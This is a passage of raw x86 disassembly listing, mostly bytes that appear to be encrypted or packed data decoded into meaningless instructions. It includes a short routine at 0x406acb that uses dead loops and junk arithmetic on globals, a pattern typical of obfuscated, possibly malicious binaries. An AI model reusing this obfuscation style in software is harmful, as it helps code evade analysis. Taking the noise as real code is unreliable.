  40690c:	arpl   WORD PTR [ecx+0x343fc057],bp
  406912:	sub    BYTE PTR [edi-0xc],bh
  406915:	jnp    0x406984
  406917:	sti    
  406918:	out    dx,al
  406919:	xchg   DWORD PTR [edx+0x36],ebx
  40691c:	inc    ebx
  40691d:	and    esp,edx
  40691f:	in     eax,0xc1
  406921:	retf   
  406922:	enter  0x39a8,0xa8
  406926:	jmp    0x7896:0xb2d75796
  40692d:	xlat   BYTE PTR ds:[ebx]
  40692e:	xchg   esi,eax
  40692f:	add    ebp,DWORD PTR [ebp-0x16c1d64]
  406935:	cmp    DWORD PTR [edx-0x21],edi
  406938:	je     0x40694f
  40693a:	imul   esi,DWORD PTR [esi+eax*4+0x32],0x55c8cf0c
  406942:	sbb    al,0x34
  406944:	repz cmp DWORD PTR [edx+esi*2+0x3d3d3a4b],esi
  40694c:	dec    ebx
  40694d:	ss xchg edi,eax
  40694f:	std    
  406950:	sub    DWORD PTR [ebx-0x58],ecx
  406953:	inc    esp
  406954:	dec    esi
  406955:	fimul  DWORD PTR ss:[ebp+esi*4-0x46eac7fd]
  40695d:	mov    bh,0x86
  40695f:	pop    ecx
  406960:	add    edx,DWORD PTR [ebx]
  406962:	dec    edi
  406963:	mov    al,0xaf
  406965:	mov    ds:0xa7e8d7ef,eax
  40696a:	leave  
  40696b:	ins    DWORD PTR es:[edi],dx
  40696c:	loop   0x406964
  40696e:	sar    BYTE PTR [edi+0x3e],0x8f
  406972:	cmp    DWORD PTR [eax+0x1c],0x3fa22e3a
  406979:	ins    DWORD PTR es:[edi],dx
  40697a:	cwde   
  40697b:	outs   dx,BYTE PTR ds:[esi]
  40697c:	pop    eax
  40697d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40697e:	adc    bl,BYTE PTR [ecx+edi*8]
  406981:	loopne 0x4069bf
  406983:	into   
  406984:	sbb    esp,edx
  406986:	xor    eax,0x976b589e
  40698b:	sbb    esp,DWORD PTR [edx-0x5a]
  40698e:	bnd call 0x88697154
  406994:	push   ss
  406995:	rcr    DWORD PTR [edx-0x3ebc3b98],cl
  40699b:	push   esp
  40699c:	sbb    al,0xd3
  40699e:	fstp   TBYTE PTR [esp+esi*8]
  4069a1:	retf   
  4069a2:	mov    eax,ds:0x386e7f61
  4069a7:	push   0x38f958ce
  4069ac:	jle    0x406973
  4069ae:	leave  
  4069af:	xchg   esi,eax
  4069b0:	(bad)  
  4069b1:	lea    ebp,[edi+0x7d]
  4069b4:	out    0x21,al
  4069b6:	mov    edi,0x233e2ee
  4069bb:	fcomp  DWORD PTR [eax+0x529f7a15]
  4069c1:	add    eax,0x9b8f359f
  4069c6:	xlat   BYTE PTR ds:[ebx]
  4069c7:	int    0xe2
  4069c9:	jne    0x406951
  4069cb:	mov    WORD PTR [ecx-0x28164baf],?
  4069d1:	pushf  
  4069d2:	mov    bl,0x60
  4069d4:	ret    0xa9f0
  4069d7:	outs   dx,DWORD PTR ds:[esi]
  4069d8:	fsub   st,st(1)
  4069da:	lods   al,BYTE PTR ds:[esi]
  4069db:	add    al,0x19
  4069dd:	sbb    eax,0x10c8d121
  4069e2:	and    edx,DWORD PTR ds:0xc64ec9b
  4069e8:	xchg   ebx,eax
  4069e9:	mov    ah,0x18
  4069eb:	mov    al,ds:0x5c89c735
  4069f0:	mov    eax,ds:0x129d8595
  4069f5:	adc    BYTE PTR [ebx-0x4f99b905],dh
  4069fb:	fs adc eax,0x365ad10a
  406a01:	cli    
  406a02:	inc    esp
  406a03:	es sahf 
  406a05:	out    0x99,al
  406a07:	adc    eax,0x29ae8e00
  406a0c:	push   edi
  406a0d:	cli    
  406a0e:	cmp    eax,eax
  406a10:	test   DWORD PTR [eax],edx
  406a12:	xchg   edx,eax
  406a14:	mov    cl,0x62
  406a16:	jg     0x406a0d
  406a18:	scas   al,BYTE PTR es:[edi]
  406a19:	jns    0x406a22
  406a1b:	jp     0x406a06
  406a1d:	in     al,0x85
  406a1f:	mov    ds:0xa34507f7,eax
  406a24:	jp     0x406a36
  406a26:	pop    esp
  406a27:	loop   0x406aa2
  406a29:	mov    bl,BYTE PTR [ecx]
  406a2b:	(bad)  
  406a2c:	stc    
  406a2d:	xor    esp,DWORD PTR [di+0x7d0c]
  406a32:	jo     0x406aad
  406a34:	rep outs dx,BYTE PTR ds:[esi]
  406a36:	jp     0x406a21
  406a38:	mov    BYTE PTR [ecx+0x7a],0x2e
  406a3c:	inc    ebp
  406a3d:	cmp    edx,edi
  406a3f:	nop
  406a40:	sub    ebp,DWORD PTR [edi-0x158616e]
  406a46:	sub    al,0xf1
  406a48:	cmp    al,0xa1
  406a4a:	test   eax,0xd14fa12a
  406a4f:	repnz repz push cs
  406a52:	inc    esi
  406a53:	call   FWORD PTR [ebp-0x28]
  406a56:	mov    edi,0x278a92cc
  406a5b:	inc    ebx
  406a5c:	cmp    al,0x77
  406a5e:	pop    ebx
  406a5f:	adc    eax,0x54afb376
  406a64:	jne    0x406a20
  406a66:	rcr    bl,1
  406a68:	jo     0x406a4d
  406a6a:	push   0xbb32dfb0
  406a6f:	repnz mov dh,0x5
  406a72:	aaa    
  406a73:	sbb    cl,dh
  406a75:	call   0xcd5ea9b6
  406a7a:	(bad)  
  406a7b:	adc    eax,0xbd1dffca
  406a80:	push   ebx
  406a81:	jmp    0x3637:0x6a77cdae
  406a88:	mov    ah,0x94
  406a8a:	fsub   QWORD PTR [edi-0x31]
  406a8d:	jmp    0x406adf
  406a8f:	sub    eax,0xce622dbd
  406a94:	pushf  
  406a95:	and    BYTE PTR [ebx],cl
  406a97:	or     esi,DWORD PTR [esi+0x38]
  406a9a:	or     edx,DWORD PTR [esi+0x4cd913b9]
  406aa0:	loopne 0x406a78
  406aa2:	int3   
  406aa3:	scas   eax,DWORD PTR es:[edi]
  406aa4:	ret    0xbe53
  406aa7:	push   es
  406aa8:	xchg   esp,eax
  406aa9:	xlat   BYTE PTR ds:[ebx]
  406aaa:	add    dh,bl
  406aac:	xor    ebp,ebx
  406aae:	adc    BYTE PTR [ebx-0x53065ae5],ah
  406ab4:	(bad)  
  406ab5:	push   ds
  406ab6:	lods   eax,DWORD PTR ds:[esi]
  406ab7:	push   ebx
  406ab8:	jmp    0x406a82
  406aba:	mov    bl,0x8f
  406abc:	jg     0x406ad9
  406abe:	outs   dx,BYTE PTR ds:[esi]
  406abf:	ret    
  406ac0:	xor    eax,ecx
  406ac2:	add    eax,0x32729c
  406ac7:	leave  
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e6fb,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fd01,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fcd9
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e6ef,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fcd9
  406b20:	and    esi,DWORD PTR ds:0x42e128
  406b26:	mov    DWORD PTR ds:0x42fcd9,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e6f3,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e6f3,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e6f3,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e2df
  406b61:	mov    edi,DWORD PTR ds:0x42e6f3
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e6f3,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fcf1,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fcf1,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fcf1,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fcfd
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e53f
  406bad:	mov    edi,DWORD PTR ds:0x42fcf1
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fcf1,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fce5,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fce5
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fce5,edi
  406bdb:	cmp    DWORD PTR ds:0x42fce5,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fce5,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fced
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e45b
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fd76,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fd76
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fd76,edi
  406c22:	cmp    DWORD PTR ds:0x42fd76,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e707
  406c34:	push   0x42e1a4
  406c39:	call   DWORD PTR ds:0x42e543
  406c3f:	cmp    DWORD PTR ds:0x42fd76,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fd76
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fd76,edi
  406c59:	cmp    DWORD PTR ds:0x42fd76,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e713,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e70b,0x42fd76
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0x21
  406c9b:	mov    es,WORD PTR [eax+edi*4+0x7070c517]
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406c7b
  406ca7:	or     ebx,DWORD PTR [ecx]
  406ca9:	push   DWORD PTR [edx+0x1353e0ea]
  406caf:	call   0xd63e4a32
  406cb4:	cmc    
  406cb5:	int3   
  406cb6:	je     0x406c56
  406cb8:	cmc    
  406cb9:	cmp    esi,DWORD PTR ds:0xd03d1dbd
  406cbf:	push   cs
  406cc0:	xchg   edi,eax
  406cc1:	dec    ebx
  406cc2:	div    bh
  406cc4:	push   ebx
  406cc5:	xor    BYTE PTR [eax+0x94038a1],ah
  406ccb:	sbb    eax,0x5858cb77
  406cd0:	sub    edi,DWORD PTR [ecx+ebx*2]
  406cd3:	cs ret 0xc5a9
  406cd7:	mov    ebp,0x46afd6c3
  406cdc:	shr    BYTE PTR [eax],0x77
  406cdf:	jne    0x406d30
  406ce1:	xor    BYTE PTR [eax],cl
  406ce3:	mov    edx,0x8face86d
  406ce8:	jae    0x406d50
  406cea:	dec    ecx
  406ceb:	mov    ecx,0x9a7e2db5
  406cf0:	xor    ah,BYTE PTR [ebx]
  406cf2:	loope  0x406d22
  406cf4:	inc    edi
  406cf5:	test   al,0xa5
  406cf7:	sbb    eax,DWORD PTR [ebx]
  406cf9:	sbb    al,0x60
  406cfb:	and    BYTE PTR [esi+0x57],bh
  406cfe:	push   eax
  406cff:	pop    ds
  406d00:	jmp    0x406d5e
  406d02:	out    dx,eax
  406d03:	in     eax,dx
  406d04:	adc    dh,BYTE PTR [ecx-0x353928f4]
  406d0a:	jns    0x406c8d
  406d0c:	ret    0x382b
  406d0f:	inc    edi
  406d10:	nop
  406d11:	jle    0x406d0b
  406d13:	xchg   esp,eax
  406d14:	fs dec esi
  406d16:	adc    eax,0xcb5a8fff
  406d1b:	mov    cl,0xe3
  406d1d:	push   ebp
  406d1e:	dec    ecx
  406d1f:	mov    eax,DWORD PTR [ebx]
  406d21:	mov    eax,ds:0x47cb74fc
  406d26:	mov    esp,0x169231bb
  406d2b:	pop    esp
  406d2c:	frstor [edx+eax*8-0x9]
  406d30:	and    BYTE PTR [ecx+edi*2+0x20],bl
  406d34:	loope  0x406d2e
  406d36:	jns    0x406d69
  406d38:	daa    
  406d39:	inc    ecx
  406d3a:	sbb    eax,0xb957bef5
  406d3f:	jle    0x406db3
  406d41:	cmp    al,BYTE PTR [ebx+0x355dd7b9]
  406d47:	popf   
  406d48:	pop    ss
  406d49:	sbb    al,0xf2
  406d4b:	xchg   edi,eax
  406d4c:	or     al,BYTE PTR [edi]
  406d4e:	pop    ebp
  406d4f:	(bad)  
  406d50:	cld    
  406d51:	(bad)  
  406d53:	push   0xffffffef
  406d55:	mov    es,WORD PTR [ebx+0x12102735]
  406d5b:	stc    
  406d5c:	push   edx
  406d5d:	push   edx
  406d5e:	imul   eax,DWORD PTR [eax+0x17],0x5a
  406d62:	and    ebp,DWORD PTR [ebx-0x62c947d4]
  406d68:	mov    eax,ds:0x55cde2c5
  406d6d:	cmp    DWORD PTR [esi-0xb],edi
  406d70:	fnstsw WORD PTR [edx-0x3c]
  406d73:	(bad)  
  406d74:	sahf   
  406d75:	fidivr WORD PTR [ebx+0xc4adb18]
  406d7b:	add    eax,0x64d7646
  406d80:	pop    esi
  406d81:	cmp    BYTE PTR [edi-0x40c613f5],bh
  406d87:	aam    0xe
  406d89:	add    bh,BYTE PTR [ebp+esi*1+0x60bb4961]
  406d90:	data16 cld 
  406d92:	es xchg ebp,eax
  406d94:	xor    eax,0x7c4ae2b0
  406d99:	pop    ecx
  406d9a:	imul   ebp,ecx,0x761216b
  406da0:	inc    ecx
  406da1:	jecxz  0x406d37
  406da3:	sar    BYTE PTR [edx-0x9645e84],0x2d
  406daa:	mov    eax,0xfdd5538a
  406daf:	xchg   edi,eax
  406db0:	(bad)  
  406db1:	adc    eax,0x4d37b4eb
  406db6:	out    dx,al
  406db7:	push   0xffffffd2
  406db9:	imul   ebp,esp,0x1e9b52c4
  406dbf:	xor    DWORD PTR [esi+0x50],esp
  406dc2:	lock sub BYTE PTR [edx-0x132ac5ad],bl
  406dc9:	mov    cl,dl
  406dcb:	test   DWORD PTR [eax],0x2943cdba
  406dd1:	(bad)  
  406dd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dd3:	mov    esp,0xe79eb79c
  406dd8:	jle    0x406e55
  406dda:	add    DWORD PTR ds:[ebx-0x79],ecx
  406dde:	sub    eax,0x79e00bf8
  406de3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406de4:	or     al,0x11
  406de6:	sub    edi,ecx
  406de8:	push   0x18
  406dea:	push   ecx
  406deb:	into   
  406dec:	aad    0x31
  406dee:	add    al,0x72
  406df0:	pop    edi
  406df1:	mov    eax,ds:0xe8b9ea87
  406df6:	sub    al,0xcd
  406df8:	jnp    0x406df0
  406dfa:	fmulp  st(6),st
  406dfc:	mov    ds:0x7dfd103,al
  406e01:	(bad)  
  406e02:	icebp  
  406e03:	xchg   esp,eax
  406e04:	and    DWORD PTR [esi],ebx
  406e06:	rol    DWORD PTR [esi+0x1cbaaa5f],1
  406e0c:	les    edi,FWORD PTR [edi]
  406e0e:	daa    
  406e0f:	and    ax,0xd6f7
  406e13:	scas   eax,DWORD PTR es:[edi]
  406e14:	stos   BYTE PTR es:[edi],al
  406e15:	push   edx
  406e16:	sbb    DWORD PTR [edi+ebx*4-0x3bc2c4e5],ebx
  406e1d:	inc    ebp
  406e1e:	das    
  406e1f:	inc    ecx
  406e20:	inc    esi
  406e21:	add    ch,ah
  406e23:	pop    edx
  406e24:	into   
  406e25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e26:	jb     0x5be9309c
  406e2c:	and    al,0xf2
  406e2e:	mov    ds:0x46c4bf78,eax
  406e33:	cmp    DWORD PTR [ecx-0x44ab3666],edi
  406e39:	fst    DWORD PTR [edi]
  406e3b:	inc    ebp
  406e3c:	add    ecx,ebp
  406e3e:	mov    WORD PTR ds:0xd65ba3b,cs
  406e44:	push   cs
  406e45:	fisubr WORD PTR [edi]
  406e47:	xor    dh,BYTE PTR [edi-0x5c]
  406e4a:	or     DWORD PTR [ebp+0x7f],ebp
  406e4d:	inc    edi
  406e4e:	sti    
  406e4f:	jmp    0x4d52:0x43867f7a
  406e56:	test   al,0xe8
  406e58:	dec    edi
  406e59:	fild   QWORD PTR [edx-0x6f7efea2]
  406e5f:	scas   al,BYTE PTR es:[edi]
  406e60:	xor    ebp,edx
  406e62:	and    ecx,ebp
  406e64:	mov    ds:0x5018cc21,eax
  406e69:	call   FWORD PTR [ecx]
  406e6b:	xchg   DWORD PTR [edi-0x5b],ecx
  406e6e:	pop    ecx
  406e6f:	or     DWORD PTR [edi-0x32],0x8c546277
  406e76:	enter  0xfe73,0xe1
  406e7a:	fwait
  406e7b:	push   edi
  406e7c:	lock push eax
  406e7e:	mov    ecx,0xf7e3f067
  406e83:	test   al,0xce
  406e85:	rol    DWORD PTR [eax-0x74e1d0bd],cl
  406e8b:	push   ebp
  406e8c:	retf   0x2644
  406e8f:	xor    BYTE PTR es:[esi+0x67b4d521],cl
  406e96:	arpl   WORD PTR [ecx],di
  406e98:	adc    DWORD PTR [ebx-0x719c2e25],edi
  406e9e:	ret    
  406e9f:	icebp  
  406ea0:	cli    
  406ea1:	dec    ebp
  406ea2:	cmp    DWORD PTR [edi],esp
  406ea4:	push   ss
  406ea5:	or     edi,0x40
  406ea8:	lock rcr BYTE PTR [ecx],cl
  406eab:	pop    ds
  406eac:	popa   
  406ead:	scas   eax,DWORD PTR es:[edi]
  406eae:	dec    ecx
  406eaf:	(bad)  
  406eb0:	cmp    BYTE PTR [edx+0x1da528f5],ah
  406eb6:	jae    0x406e3d
  406eb8:	jae    0x406f35
  406eba:	pop    edx
  406ebb:	push   0x733866f
  406ec0:	jno    0x406eb1
  406ec2:	out    0xd9,al
  406ec4:	lods   al,BYTE PTR ds:[esi]
  406ec5:	loopne 0x406f32
  406ec7:	xor    bl,cl
  406ec9:	sbb    ah,BYTE PTR [ebp-0x65]
  406ecc:	dec    esp
  406ecd:	inc    edi
  406ece:	xchg   DWORD PTR [esi],edi
  406ed0:	push   ecx
  406ed1:	popa   
  406ed2:	into   
  406ed3:	push   0x78e0b24
  406ed8:	jge    0x406ea1
  406eda:	sbb    al,0x3f
  406edc:	popa   
  406edd:	lahf   
  406ede:	xor    edi,DWORD PTR [edx-0x4ea5bccc]
  406ee4:	es push cs
  406ee6:	jbe    0x406ed9
  406ee8:	ins    BYTE PTR es:[edi],dx
  406ee9:	add    DWORD PTR [esi],edx
  406eeb:	pop    esi
  406eec:	sbb    DWORD PTR [ebx-0x1b],0xede98ec8
  406ef3:	lods   eax,DWORD PTR ds:[esi]
  406ef4:	mov    eax,ebp
  406ef6:	clc    
  406ef7:	xchg   edi,eax
  406ef8:	iret   
  406ef9:	adc    al,0x8c
  406efb:	fcmove st,st(5)
  406efd:	mov    dl,0xc8
  406eff:	sub    bl,BYTE PTR [ecx-0x49]
  406f02:	xor    al,0x91
  406f04:	sub    eax,0x5c07e0b8
  406f09:	sbb    eax,0x7320e4a2
  406f0e:	imul   eax,esp,0x52983a91
  406f14:	in     eax,0x33
  406f16:	cmc    
  406f17:	add    BYTE PTR [edx],bl
  406f19:	pop    ds
  406f1a:	push   0x3b6aa639
  406f1f:	cdq    
  406f20:	fist   DWORD PTR [edi]
  406f22:	mov    dh,BYTE PTR [edi+0x8519a76]
  406f28:	inc    esi
  406f29:	jbe    0x406f38
  406f2b:	pop    esi
  406f2c:	push   0x53
  406f2e:	loope  0x406f5e
  406f30:	fwait
  406f31:	and    dl,bh
  406f33:	and    edi,DWORD PTR [edx+0x2e96cb7f]
  406f39:	dec    edi
  406f3a:	mov    cl,0x7e
  406f3c:	sbb    DWORD PTR [esi],0x85c91f5f
  406f42:	mov    eax,ds:0x4f0e8277
  406f47:	arpl   WORD PTR [edx],di
  406f49:	push   0xffffffb8
  406f4b:	push   ebp
  406f4c:	test   BYTE PTR [ebx+eax*2+0x4d403d7a],0x6b
  406f54:	mov    al,0x56
  406f56:	or     BYTE PTR [eax],cl
  406f58:	inc    ebp
  406f59:	pop    esp
  406f5a:	cwde   
  406f5b:	hlt    
  406f5c:	push   ebp
  406f5d:	sbb    edi,edi
  406f5f:	jbe    0x406fa6
  406f61:	add    BYTE PTR [ecx-0x4705d42d],0xb3
  406f68:	ret    
  406f69:	int    0x56
  406f6b:	aam    0xc9
  406f6d:	sbb    cl,al
  406f6f:	ret    0x5dd9
  406f72:	and    esi,edi
  406f74:	jo     0x406f5f
  406f76:	push   cs
  406f77:	rcr    DWORD PTR [eax+0x67],1
  406f7a:	push   ss
  406f7b:	mov    bh,0x55
  406f7d:	sahf   
  406f7e:	or     BYTE PTR [ecx],ch
  406f80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f81:	mov    dl,0x96
  406f83:	popa   
  406f84:	mov    ebx,DWORD PTR [ebx+0x41]
  406f87:	mov    ch,0xbf
  406f89:	aaa    
  406f8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f8b:	xchg   esi,eax
  406f8c:	into   
  406f8d:	add    al,0xb7
  406f8f:	sbb    dl,BYTE PTR [edx+0x3aabf6]
  406f95:	(bad)  
  406f96:	jmp    0x4de2:0xdefe732d
  406f9d:	shr    BYTE PTR [esi+0x7],0x90
  406fa1:	dec    edi
  406fa2:	outs   dx,DWORD PTR ds:[esi]
  406fa3:	ret    0xf2de
  406fa6:	mov    edx,0xc0eb2730
  406fab:	sbb    dh,BYTE PTR gs:[ecx-0x17]
  406faf:	in     al,0x8e
  406fb1:	mov    DWORD PTR [ebx-0x7e],ebx
  406fb4:	jae    0x407014
  406fb6:	popa   
  406fb7:	push   edx
  406fb8:	adc    eax,0xa3a374f4
  406fbd:	loope  0x407005
  406fbf:	sub    DWORD PTR [ebx+0x7b89c571],esp
  406fc5:	scas   eax,DWORD PTR es:[edi]
  406fc6:	pop    esp
  406fc7:	mov    ebp,0xb052751e
  406fcc:	push   esi
  406fcd:	popf   
  406fce:	or     esp,eax
  406fd0:	mov    al,ds:0xbae9cbaa
  406fd5:	mov    ebx,0x31cc45c7
  406fda:	add    eax,0x1581f89f
  406fdf:	jb     0x406fde
  406fe1:	inc    edx
  406fe2:	add    BYTE PTR [ebx],cl
  406fe4:	out    0x42,eax
  406fe6:	add    bh,al
  406fe8:	inc    ebp
  406fe9:	aam    0xf1
  406feb:	test   DWORD PTR [eax+edi*8-0x2e23ba39],ebx
  406ff2:	test   DWORD PTR [eax+edi*8+0xac05],ebx
  406ff9:	add    cl,ch
  406ffb:	dec    eax
  406ffc:	add    eax,DWORD PTR [eax]
  406ffe:	add    BYTE PTR [esi*2+0x5a51bed1],bl
  407005:	mov    bl,0x71
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   WORD PTR [ebp-0x385fb266],dx
  407010:	ret    0x7070
  407013:	and    BYTE PTR [ebp+0x70],bh
  407016:	jo     0x40701e
  407018:	jle    0x406fa8
  40701a:	pop    ebx
  40701b:	ficomp DWORD PTR [ebp+0x507142d9]
  407021:	fsubrp st(7),st
  407023:	loopne 0x406fc2
  407025:	add    eax,0xbd792d40
  40702a:	and    al,0xa2
  40702c:	add    eax,0xc9ff311
  407031:	sbb    BYTE PTR [ecx-0x2f],al
  407034:	bound  edx,QWORD PTR [esi]
  407036:	push   ebp
  407037:	popf   
  407038:	cmp    esp,DWORD PTR [edx+0x67f177ff]
  40703e:	pop    ecx
  40703f:	jns    0x407096
  407041:	push   edx
  407042:	out    0xb0,eax
  407044:	in     al,dx
  407045:	enter  0x4141,0x8a
  407049:	jmp    0x407065
  40704b:	jbe    0x407022
  40704d:	add    edi,DWORD PTR [esi+0x2e]
  407050:	xlat   BYTE PTR ds:[ebx]
  407051:	aaa    
  407052:	mov    ch,0xb6
  407054:	xor    al,0xe4
  407056:	mov    ah,0x59
  407058:	cli    
  407059:	jb     0x40705c
  40705b:	xchg   esp,eax
  40705c:	aaa    
  40705d:	retf   
  40705e:	mov    ?,ecx
  407060:	(bad)  ss:[ebx-0x5]
  407064:	xor    al,0x84
  407066:	rol    BYTE PTR [ecx],cl
  407068:	mov    esp,0x29c21d56
  40706d:	push   edx
  40706e:	int    0x4f
  407070:	and    eax,0x93f715fe
  407075:	cs mov bl,0x6e
  407078:	ror    BYTE PTR [eax-0x27],1
  40707b:	pusha  
  40707c:	daa    
  40707d:	and    bh,ch
  40707f:	push   ecx
  407080:	(bad)  
  407082:	mov    dh,0xc6
  407084:	clc    
  407085:	inc    esi
  407086:	adc    eax,DWORD PTR [esi+0x30a4f946]
  40708c:	dec    esp
  40708d:	dec    ebp
  40708e:	aam    0x28
  407090:	lods   al,BYTE PTR ds:[esi]
  407091:	xchg   ebx,eax
  407092:	loop   0x4070e7
  407094:	rcr    BYTE PTR [esi-0x2a],cl
  407097:	xchg   ebp,eax
  407098:	jne    0x40709e
  40709a:	ret    
  40709b:	inc    edx
  40709c:	inc    ebp
  40709d:	jge    0x407116
  40709f:	stc    
  4070a0:	std    
  4070a1:	daa    
  4070a2:	popf   
  4070a3:	psadbw mm5,QWORD PTR [ebx+0x69]
  4070a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070a8:	cli    
  4070a9:	ret    
  4070aa:	popf   
  4070ab:	mov    ecx,edx
  4070ad:	jecxz  0x407106
  4070af:	imul   bh
  4070b1:	mov    dl,0x2a
  4070b3:	fstp   QWORD PTR [edx-0x75e4c840]
  4070b9:	sub    dl,BYTE PTR [ebp+ecx*8-0xcd9ba3d]
  4070c0:	shr    DWORD PTR [esi],cl
  4070c2:	dec    esp
  4070c3:	ror    DWORD PTR [esi+0x1e32c40],cl
  4070c9:	mov    bl,0xa9
  4070cb:	sti    
  4070cc:	mov    bl,BYTE PTR [eax]
  4070ce:	test   al,0x3f
  4070d0:	add    edx,DWORD PTR [ecx]
  4070d2:	dec    eax
  4070d3:	outs   dx,DWORD PTR ds:[esi]
  4070d4:	mov    dl,0xa7
  4070d6:	sub    ecx,edx
  4070d8:	pop    ds
  4070d9:	jae    0x4070b6
  4070db:	xor    BYTE PTR [esi+0x3c11b19d],ch
  4070e1:	dec    ecx
  4070e2:	xlat   BYTE PTR ds:[ebx]
  4070e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070e4:	pop    ss
  4070e5:	sldt   WORD PTR [eax-0x4f29f5e9]
  4070ec:	js     0x40711b
  4070ee:	or     DWORD PTR [ecx+ecx*8],0x1e44023d
  4070f5:	xchg   BYTE PTR [esi+0x53],bh
  4070f8:	jmp    0x211019d
  4070fd:	test   BYTE PTR [eax],al
  4070ff:	dec    eax
  407100:	mov    edx,0x983e062d
  407105:	leave  
  407106:	int3   
  407107:	or     al,BYTE PTR [eax-0x502dcea7]
  40710d:	and    ecx,DWORD PTR [ecx-0x126da92d]
  407113:	and    bl,BYTE PTR [ebx+eiz*2-0x2abfca54]
  40711a:	pop    esi
  40711b:	xor    dh,BYTE PTR [esi]
  40711d:	inc    ebx
  40711e:	sbb    ebx,DWORD PTR [esi]
  407120:	jle    0x407167
  407122:	pop    ds
  407123:	inc    ebp
  407124:	cdq    
  407125:	sar    DWORD PTR [esp+eiz*4+0x27eabed2],cl
  40712c:	sub    al,0x2
  40712e:	jg     0x407130
  407130:	adc    DWORD PTR [edx-0x32],esp
  407133:	push   edx
  407134:	out    dx,eax
  407135:	leave  
  407136:	and    ch,BYTE PTR [edi]
  407138:	push   ds
  407139:	mov    ebp,gs
  40713b:	repnz push ss
  40713d:	cwde   
  40713e:	imul   ebp,DWORD PTR [ebx+0x7d],0x8e7430b7
  407145:	push   es
  407146:	jnp    0x407149
  407148:	retf   
  407149:	mov    esp,0xa7c31533
  40714e:	mov    cs,WORD PTR [eax+0x47]
  407151:	mov    bh,0x3b
  407153:	mov    al,0x37
  407155:	outs   dx,BYTE PTR ds:[esi]
  407156:	cmp    DWORD PTR [ebp+0x42],ecx
  407159:	fisubr WORD PTR [ecx]
  40715b:	push   cs
  40715c:	mov    ebx,0x37276501
  407161:	and    ah,BYTE PTR [ebx]
  407163:	jne    0x4071b0
  407165:	or     al,0xe9
  407167:	dec    edx
  407168:	jbe    0x40718b
  40716a:	std    
  40716b:	jbe    0x407151
  40716d:	fs push ecx
  40716f:	xor    edx,DWORD PTR [esi-0x77]
  407172:	mov    dh,0x61
  407174:	ror    ebx,1
  407176:	fnclex 
  407178:	popa   
  407179:	add    al,0xdb
  40717b:	mov    ecx,0x2b6af307
  407180:	mov    esp,0x58f7eb37
  407185:	ja     0x4071d0
  407187:	popa   
  407188:	ins    DWORD PTR es:[edi],dx
  407189:	shl    BYTE PTR [ecx+0x1f7ab76e],cl
  40718f:	out    dx,al
  407190:	aam    0x2a
  407192:	xchg   edi,eax
  407193:	pop    ebp
  407194:	out    dx,al
